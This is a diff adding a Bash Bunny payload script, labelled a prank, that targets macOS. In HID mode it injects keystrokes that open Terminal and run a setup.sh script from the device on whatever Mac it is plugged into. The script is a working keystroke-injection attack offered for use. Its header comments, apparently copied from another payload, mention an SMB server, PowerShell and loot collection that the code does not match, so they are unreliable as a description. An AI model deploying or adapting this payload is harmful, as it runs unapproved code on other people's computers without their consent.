@@ -1,0 +1,72 @@
+#!/bin/bash
+#
+# Title:         Mac Rickroll 1.0
+# Author:        startrk1995
+# Version:       1.0
+# Build: 		 1000
+# Category:      Prank
+# Target:        Mac OSx
+# Attackmodes:   HID, Ethernet
+# !!! works only with Bash Bunny FW 1.1 and up !!!
+#
+#
+# LED                      Status
+# ----------------------- + --------------------------------------------
+# SETUP                   + Setup
+# FAIL                    + No /tools/impacket/examples/smbserver.py found
+# FAIL2                   + Target did not acquire IP address
+# Yellow single blink     + Initialization
+# Yellow double blink     + HID Stage
+# Yellow triple blink     + Wait for IP coming up
+# Cyan inv single blink   + Wait for Handshake (SMBServer Coming up)
+# Cyan inv quint blink    + Powershell scripts running
+# White fast blink        + Cleanup, copy Files to <root>/loot
+# Green              	  + Finished
+# ----------------------- + --------------------------------------------
+
+logger -t MacRickroll "########################### Start payload MacRickroll #############################"
+
+
+###### Lets Start ####
+LED SETUP
+
+GET SWITCH_POSITION
+
+# Some Variables
+SWITCHDIR=/root/udisk/payloads/$SWITCH_POSITION
+HSWITCHDIR=/Volumes/BashBunny/payloads/$SWITCH_POSITION
+
+# if the file DEBUG in payload folder exist, enter debug mode
+if [ -f $SWITCHDIR/DEBUG ];then
+	DEBUG=1   # 1= Debug on / 0= Debug off
+	tail -f /var/log/syslog > /tmp/log.txt &
+else
+	DEBUG=0
+fi
+
+
+# HID STAGE
+# Runs minimized powershell waiting for Bash Bunny to appear as 172.16.64.1.
+logger -t MacRickroll "### Enter HID Stage ###"
+LED STAGE1
+ATTACKMODE HID STORAGE
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 3000
+QUACK STRING export Switch=$SWITCH_POSITION;$HSWITCHDIR/setup.sh
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING $HSWITCHDIR/setup.sh
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ENTER
+
+LED G
+
+
+
+
+
+
